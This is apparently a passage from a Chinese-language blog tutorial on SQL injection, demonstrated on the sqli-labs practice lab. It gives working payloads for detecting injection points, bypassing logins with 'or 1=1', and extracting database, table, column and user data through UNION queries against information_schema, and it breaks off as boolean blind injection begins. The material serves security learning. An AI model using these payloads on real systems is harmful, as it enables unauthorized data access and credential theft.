<p>举个例子： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">prepare</span> stmt1 <span class="keyword">from</span> <span class="string">&#x27;select * from users where id=?&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="number">3</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">execute</span> stmt1 <span class="keyword">using</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> hdf      <span class="operator">|</span> hdf      <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>还可以： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@s</span><span class="operator">=</span><span class="string">&#x27;select * from users where id=?&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">prepare</span> stmt2 <span class="keyword">from</span> <span class="variable">@s</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@b</span><span class="operator">=</span><span class="number">4</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">execute</span> stmt2 <span class="keyword">using</span> <span class="variable">@b</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> xioazz   <span class="operator">|</span> xiozz    <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>注意点：</p>
<ol type="1">
<li>stmt_name 作为 preparable_stmt 的接收者，唯一标识，不区分大小写；</li>
<li>preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来；</li>
<li>定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值；</li>
<li>PREPARE stmt_name 的作用域是session级</li>
</ol>
<p>预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。</p>
<h1 id="常规注入方法详解">2. 常规注入方法详解</h1>
<p><strong>注意：以下演示的都是在没有过滤的情况下进行的，过滤绕过单独出一章。</strong></p>
<h2 id="注入之前的步骤">2.1. 注入之前的步骤</h2>
<p>在注入之前一般都需要做三件事：</p>
<ol type="1">
<li>判断注入点；</li>
<li>判断类型（主要包括变量类型和是否有回显）；</li>
<li>fuzz过滤名单；</li>
</ol>
<h3 id="第12件事">2.1.1. 第1，2件事</h3>
<p>但是前两者一般都是同时进行的。<strong>因为判断注入点一般是通过传入不同的参数，然后观察返回的页面是否有异常来判断是否存在注入点；而判断变量类型也是通过传入不同的闭合方式来观察返回的页面是否有异常从而得到结果</strong>。</p>
<p>简单说下我常用的办法。首先分别尝试如下两个payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1=1 # 此时传入的参数id的值为 1=1</span><br><span class="line">?id=1=2 # 此时传入的参数id的值为 1=2</span><br></pre></td></tr></table></figure></p>
<p>如果是数字型的（没有闭合方式），假设后台语句如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">select username,password <span class="keyword">from</span> users where id = <span class="variable">$id</span>;</span><br></pre></td></tr></table></figure></p>
<p>那么上述两个参数传入之后的查询语句分别为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure></p>
<p>因为会先计算后面的，然后再赋值给id，从而最后的语句为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>; # <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> 为真，所以最后值为<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">0</span>; # <span class="number">1</span> <span class="operator">=</span> <span class="number">2</span> 为假，所以最后值为<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<p>所以前者会返回id=1的用户的信息；而后者返回id=0的用户信息，但是一般不存在id=0的信息，所以不会有结果。从而就可以判断出存在注入点，并且变量类型为数字型。</p>
<p>以sqli-labs的第2关为例：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423193717.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423193701.png" /></p>
<p>但是，如果是字符型的，那么上述两者得到的页面都是一样的。假设后台语句如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">select username,password <span class="keyword">from</span> users where id = <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>那么上述两个payload传入之后的语句为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1=1&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1=2&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>此时'1=1'因为被单引号包裹，从而不会被当作一个式子被执行。</p>
<blockquote>
<p>这里有一个关于数据库的小知识：如果数据库中id为int型的，但是查询语句中的id为字符型的，那么数据库会先将查询语句中的字符串变成数字，然后再与数据库中的id作比较。</p>
<p>字符串变成数字的规则：如果字符串的开头为有效数字，那么从第一个数字开始到第一个非有效数字为止，字符串就会变成这串数字。举个例子，id='123adf1341'那么id最终会变成id=123。这里要注意，如果第一位为0，即id='0123adf1341'，那么最终还是为id=123。</p>
<p>例子：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195043.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195103.png" /></p>
</blockquote>
<p>以sqli-labs第1关为例：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195227.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195241.png" /></p>
<p>因此，字符型的不能通过这两个payload判断。那么接下来就会分别使用如下两个payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&#x27;#</span><br></pre></td></tr></table></figure></p>
<p>上面payload带入之后的后台语句分别为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;&#x27;;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
<p>第1个sql语句因为多了一个单引号会报错；第2个sql语句中最后的单引号被注释，因此会返回id=1的结果。</p>
<blockquote>
<p>需要注意的是，上面的分号都是php代码中的，并不是真正带入数据库查询时的分号。在php中，这些符号都仅仅只是字符，并不会真的将后面的单引号和;注释掉，只有当把语句带入数据库查询时，这些符号才发挥原来的作用，这时会自动补上最后的;，因此不用当心没有;从而数据库没法执行语句。</p>
</blockquote>
<p>还是sqli-labs第1关：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423201606.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423201720.png" /></p>
<blockquote>
<p>注释要换着用，有时候用#不行，就换-- ，不过url中用+代替，所以是--+。</p>
</blockquote>
<p>如果闭合方式是双引号，那么就将payload中的单引号换成双引号即可，其他闭合方式也是一样的道理，<strong>总之就是将前面的符号闭合，后面的符号注释</strong>。最常见的就是单引号了，当然不排除有的题目恶心人。</p>
<hr />
<p>上面讲的基本就是变量类型，下面讲的就是关于回显的。</p>
<h3 id="第3件事">2.1.2. 第3件事</h3>
<p>首先要fuzz以下过滤的特殊字符和重要关键词，这样子方便后面注入语句的编写。直接用burp爆破即可。</p>
<p>推荐一个我常用的字典： - <a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">GitHub - TheKingOfDuck/fuzzDicts: Web Pentesting Fuzz 字典,一个就够了。</a></p>
<h2 id="万能密码">2.2. 万能密码</h2>
<p>后台语句一般是： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = select * <span class="keyword">from</span> users where username=<span class="string">&#x27;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;un&#x27;</span>].<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password = <span class="string">&#x27;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span> !== <span class="literal">null</span>)&#123;</span><br><span class="line">	<span class="keyword">print</span>(<span class="string">&#x27;Login Success&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>''.$_GET['un'].''</code>其实闭合方式还是单引号。</p>
<p><code>'.$_GET['un'].'</code>中的<code>.</code>是php中的字符串拼接符号，类比做python中的<code>+</code>；而外面的单引号就是保证里面的内容是字符串，可以类比做python中的str()的作用。</p>
</blockquote>
<p>如果我们输入如下payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?un=admin&#x27; or 1=1#&amp;pw=123456</span><br></pre></td></tr></table></figure></p>
<p>此时的后台语句为： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = select * <span class="keyword">from</span> users where username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27; and password = &#x27;123456&#x27;;</span></span><br></pre></td></tr></table></figure></p>
<p>此时的查询语句就相当于下面的语句 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<p>解释：此时where后面的判断条件有两个 1. 第一个：username='admin' 2. 第二个：1=1</p>
<p>两个判断条件用 or 连接，无论前面的判断条件的结果是什么，最后都是<code>any or 1 = 1</code>，因此where后面的条件为真，此时相当于执行了<code>select * from users;</code>，因此肯定会返回结果，那么<code>$result</code>自然就不会null，从而成功登录。</p>
<p>这种方法很少，不过也有。这里的注入点是在username，当然也可能在password。例题：[[Redtiger's_Hackit_WriteUp#Level-2]]</p>
<h2 id="联合查询注入">2.3. 联合查询注入</h2>
<p>这是最最常见的利用方式。主要的步骤有：（不包括注入前的步骤）</p>
<ol type="1">
<li><p>利用 order/group by 判断字段数，并且确定回显位；确定字段数的原因：union select 要求查询的字段数和表中的字段数保持一致，否则会报错。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423205609.png" /></p></li>
<li><p>利用 union select 获取数据库名；</p></li>
<li><p>利用 union select 获取特定数据库下的所有表名；</p></li>
<li><p>利用 union select 获取特定表下面的所有列名；</p></li>
<li><p>利用 union select 获取获取特定列的信息；</p></li>
</ol>
<p>下面先介绍这其中需要用到的一些函数，然后在按照步骤分别说明。</p>
<h3 id="需要用到的函数">2.3.1. 需要用到的函数</h3>
<h4 id="ordergroup-by">2.3.1.1. order/group by</h4>
<h5 id="order-by">2.3.1.1.1. order by</h5>
<p>作用：ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 DESC 关键字。</p>
<p>order by语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> columnName1,columnName2,... <span class="keyword">from</span> tableName <span class="keyword">order</span> <span class="keyword">by</span> columnName1,columnName2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>];</span><br></pre></td></tr></table></figure></p>
<p>演示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423211816.png" /></p>
<p>可以看到使用了 order by 之后返回的结果的顺序发生了改变。</p>
<hr />
<h5 id="group-by">2.3.1.1.2. group by</h5>
<p>作用：GROUP BY 语句用于配合聚合函数，根据一个或多个列对结果集进行分组。</p>
<p>group by语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> columnName1, aggregate_function(columnName) <span class="keyword">from</span> tableName <span class="keyword">group</span> <span class="keyword">by</span> columnName;</span><br></pre></td></tr></table></figure></p>
<p>常用聚合函数： - count(): 计数 - sum(): 求和 - avg(): 求平均数 - max(): 求最大值 - min(): 求最小值</p>
<p>users表中的内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+------+----------+----------+--------+                                                                                                                                                         | id   | username | password | camp   |                                                                                                                                                         +------+----------+----------+--------+                                                                                                                                                         |    1 | admin    | admin    | admin  |                                                                                                                                                         |    2 | root     | root     | root   |                                                                                                                                                         |    3 | hdf      | hdf      | common |                                                                                                                                                         |    4 | xioazz   | xiozz    | common |                                                                                                                                                         |    5 | you      | you      | common |                                                                                                                                                         |    6 | run      | run      | common |                                                                                                                                                         +------+----------+----------+--------+</span><br></pre></td></tr></table></figure></p>
<p>如果只使用group by而不使用聚合函数：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423214751.png" /></p>
<p>可以看到，只返回了3个结果，也就是不同camp字段的返回一个。</p>
<p>如果配合上聚合函数：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423214943.png" /></p>
<p>此时虽然还是返回三个结果，但是加入了聚合函数<code>max(id)</code>，此时返回的是不同camp中的id最大的用户。如果是<code>sum(id)</code>，那就是求不同camp中所有用户的id的和</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423215300.png" /></p>
<p><strong>group by (key)还有一个特性：那就是它会根据后面的key分组，并且将key作为主键，临时生成一个表，然后往里面填入信息，最后将这个临时的表返回作为结果。</strong></p>
<p>假设语句为<code>select count(*),camp from users group by camp;</code>，表还是上面那个表。</p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line">|        1 | admin  |</span><br><span class="line">|        4 | common |</span><br><span class="line">|        1 | root   |</span><br><span class="line">+----------+--------+</span><br></pre></td></tr></table></figure></p>
<p>现在来描述一下过程： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">刚开始是空表：</span><br><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line"></span><br><span class="line">查询到第一条信息，camp为admin，但是此时临时表中没有任何主键，因此先将主键插入，然后count(*)的值+1，因此得到：</span><br><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line">|        1 | admin  |</span><br><span class="line">+----------+--------+</span><br><span class="line"></span><br><span class="line">查询到第二条消息，camp为common，此时表中没有该主键，因此先将主键插入，然后把对应的count(*)值+1，得到：</span><br><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line">|        1 | admin  |</span><br><span class="line">|        1 | common |</span><br><span class="line">+----------+--------+</span><br><span class="line"></span><br><span class="line">下次camp还是common，此时表中已存在该主键，直接将count(*)值+1，得到：</span><br><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line">|        1 | admin  |</span><br><span class="line">|        2 | common |</span><br><span class="line">+----------+--------+</span><br><span class="line"></span><br><span class="line">下面也是一样的道理....</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h4 id="union-select">2.3.1.2. union select</h4>
<p>union关键词的作用是合并两个或多个select语句的结果。</p>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> columnName1[,columnName2,...] <span class="keyword">from</span> users <span class="keyword">union</span> <span class="keyword">select</span> columnName3[,columnName4,...] <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure></p>
<p>例子：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423215629.png" /></p>
<p>返回的结果中既包含id的结果，还包含password的结果。</p>
<p>需要注意的是union后面的字段数要和前面select的字段是保持一致，否则就会报错，这就是为什么要先判断字段数的原因。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224736.png" /></p>
<h4 id="group_concat">2.3.1.3. group_concat()</h4>
<p>GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。</p>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(columnName1,columnName2,...) <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>中间也可以是其他点，比如之前在[[#数据库必备知识点]]中就提到的。</p>
</blockquote>
<p>例子：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423223836.png" /></p>
<p>可以看到id和username被拼接成一个字符串返回了。</p>
<p>还有一个类似的函数concat()，这就是简单的讲多个字符串拼接，在盲注中会用到。</p>
<h3 id="判断字段数并确定回显位">2.3.2. 判断字段数并确定回显位</h3>
<h4 id="判断字段数">2.3.2.1. 判断字段数</h4>
<p>常用的payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 1,2,3,4--+ </span><br><span class="line"></span><br><span class="line">后面的数字代表有几个字段数，可以随便写，不过最好按顺序写，这样比较容易确定</span><br></pre></td></tr></table></figure></p>
<p>如果字段数不对的话，就会报错；如果字段正确的话就会显示id=1的结果。（所以这里的id的值最好数据库中存在）</p>
<p>还是以sqli-labs第1关为例：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224352.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224404.png" /></p>
<h4 id="确定回显位">2.3.2.2. 确定回显位</h4>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure></p>
<p>以sqli-labs第1关为例：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225107.png" /></p>
<p>那么接下来获取数据库，表，列的相关信息的时候就可以通过这些位置显示出来。</p>
<p>这里需要注意的是此时id的值一定要是不存在的。如果id值存在，那么返回的结果就会有至少两行，一行是对应id的信息，另一行就是1，2，3。例子如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225604.png" /></p>
<p>如果id不存在的话，就只会返回一行，也就是1，2，3那一行。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225641.png" /></p>
<p>只有这样，才能够判断出回显位到底是哪一个。</p>
<h3 id="获取数据库名">2.3.3. 获取数据库名</h3>
<p>常规的payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure></p>
<p>以sqli-labs第1关为例：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225924.png" /></p>
<p>这一步还可以获取其他信息，比如说用户名、操作系统以及数据库版本之类的 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,user(),version()--+</span><br><span class="line">?id=-1&#x27; union select 1,database(),@@version_compile_os--+</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230114.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230126.png" /></p>
<h3 id="获取特定数据库下的所有表名">2.3.4. 获取特定数据库下的所有表名</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;databaseName&#x27;),3--+</span><br><span class="line"></span><br><span class="line">databaseName为上一步获取的。</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span><br></pre></td></tr></table></figure></p>
<p>以sqli-labs第1关为例：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230715.png" /></p>
<h3 id="获取特定表下面的所有列名">2.3.5. 获取特定表下面的所有列名</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;tableName&#x27;),3--+</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;tableName&#x27;),3--+</span><br></pre></td></tr></table></figure></p>
<p>其中tableName就是上一步获得的所有表名中你想要查看的那一个</p>
<p>第二种payload只不过把数据库也加入了条件，不加也可以。假设需要查看security数据库下面的users表，如果存在多个数据库下面有users表，那么使用第一种payload就会获得多个数据库下的user表的所有列名（因为information_schema中包好了所有的数据库、表、列的信息），这样子不利于分析自己想要的列名到底属于哪一个数据库的users表。</p>
<p>以sqli-labs第1关为例：</p>
<p>第一种payload的结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423231443.png" /></p>
<p>第二种payload的结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423231520.png" /></p>
<p>可以明显看到区别。</p>
<h3 id="获取获取特定列的信息">2.3.6. 获取获取特定列的信息</h3>
<p>常规payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(columnName1[,columnName2,...]),3 from tableName--+</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(columnName1[,columnName2,...]),3 from databaseName.tableName--+</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>第二种也是限定了哪一个数据库。此时是不需要的，因为没有使用information_schema，那么默认就是从当前使用的数据库中获取信息。</p>
<p>以sqli-labs第1关为例：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423232255.png" /></p>
<h3 id="番外">2.3.7. 番外</h3>
<p>上面的演示都是基于MySQL version&gt;=5.0。如果版本&lt;5.0，那么数据库、表、列的信息只能靠猜，不过一般也猜不出来就是了。</p>
<h2 id="布尔盲注">2.4. 布尔盲注</h2>
<p>布尔盲注的使用条件： - 页面对于SQL语句的返回结果不予以显示，并且对于真条件和假条件的返回内容存在差异</p>
<p>因此，可以使用永真(or 1=1)或者永假(and 1=2)来判断页面返回的内容是否存在差异，从而判定是否可以使用布尔盲注。</p>
<p>布尔盲注的步骤一般有：</p>
<ol type="1">
<li>判断数据库长度；</li>
<li>爆数据库名；</li>
<li>爆对应数据库下的group_concat(table_name)的长度；</li>
<li>爆对应数据库下的所有表名；</li>
<li>爆对应表下的group_concat(column_name)的长度；</li>
<li>爆对应表下的所有字段名</li>
<li>爆对应字段的group_concat(columnName)的长度；</li>
<li>爆对应字段的信息；</li>
</ol>
